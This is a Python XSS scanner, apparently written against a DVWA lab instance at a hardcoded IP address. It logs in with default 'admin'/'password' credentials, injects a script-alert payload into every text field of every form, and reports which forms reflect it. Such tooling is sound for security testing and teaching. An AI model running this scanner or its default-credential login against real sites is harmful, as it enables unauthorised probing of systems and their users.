import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

def get_all_forms(url,link):
    """Given a `url`, it returns all forms from the HTML content"""
    with requests.Session() as s:
        s.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
        res = s.get(link)
        soup = bs(res.text,'html.parser')   
        payload = {i['name']:i.get('value','') for i in soup.select('input[name]')}
        #what the above line does is parse the keys and values available in the login form
        payload['username'] = 'admin'
        payload['password'] = 'password'
        s.post(link,data=payload)
            #as we have laready logged in, the login cookies are stored within the session
            #in our subsequesnt requests we are reusing the same session we have been using from the very beginning
        r = s.get(url)
        soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    action = form.attrs.get("action", "").lower()
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})

    for textarea in form.find_all("textarea"):
        # get the name attribute
        textarea_name = textarea.attrs.get("name")
        # set the type as textarea
        textarea_type = "textarea"
        # get the textarea value
        textarea_value = textarea.attrs.get("value", "")
        # add the textarea to the inputs list
        inputs.append({"type": textarea_type, "name": textarea_name, "value": textarea_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def submit_form(form_details, url, value):
    """
    Submits a form given in `form_details`
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search" or input["type"] == "textarea":
            input["value"] = value
        if "Clear" in input["name"]: #This line is present since a button would prevent the good functioning on the DVWA webpage
            input["value"] = None
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None, 
            # then add them to the data of form submission
            data[input_name] = input_value

    print(f"[+] Submitting malicious payload to {target_url}")
    print(f"[+] Data: {data}")

    link = 'http://45.147.96.25:4242/login.php'
    with requests.Session() as s:
            s.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
            res = s.get(link)
            soup = bs(res.text,'html.parser')   
            payload = {i['name']:i.get('value','') for i in soup.select('input[name]')}         
            #what the above line does is parse the keys and valuse available in the login form
            payload['username'] = 'admin'
            payload['password'] = 'password'
            s.post(link,data=payload)
                #as we have laready logged in, the login cookies are stored within the session
                #in our subsequesnt requests we are reusing the same session we have been using from the very beginning
            r = s.get(url)
            if form_details["method"] == "post":
                return s.post(target_url, data=data)
                #return requests.post(target_url, data=data)
            else:
            # GET request
                return s.get(target_url, params=data)
                #return requests.get(target_url, params=data)




def scan_xss(url,link):
    """
    Given a `url`, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    # get all the forms from the URL
    forms = get_all_forms(url,link)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<script>alert('hi')</script>"
    #js_script = "a"
    # returning value
    is_vulnerable = False
    # iterate over all forms
    count = 0
    for form in forms:
        form_details = get_form_details(form)
        #pprint('OOOOOOOOOOOOOO')
        #pprint("Clear" in form_details['inputs'][2]['value'])
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            #print(f"[+] XSS Detected on {url}")
            #print(f"[*] Form details:")
            #pprint(form_details)
            is_vulnerable = True
            count+=1
            # won't break because we want to print other available vulnerable forms
        print(f"There is {count} form vulnerable at the address {url}")
    return is_vulnerable


'''if __name__ == "__main__":
    import sys
    url = sys.argv[1] # http://45.147.96.25:4242/vulnerabilities/xss_s/  -- Targeted page
    link = sys.argv[2] # http://45.147.96.25:4242/login.php -- The login page 
    print(scan_xss(url,link))'''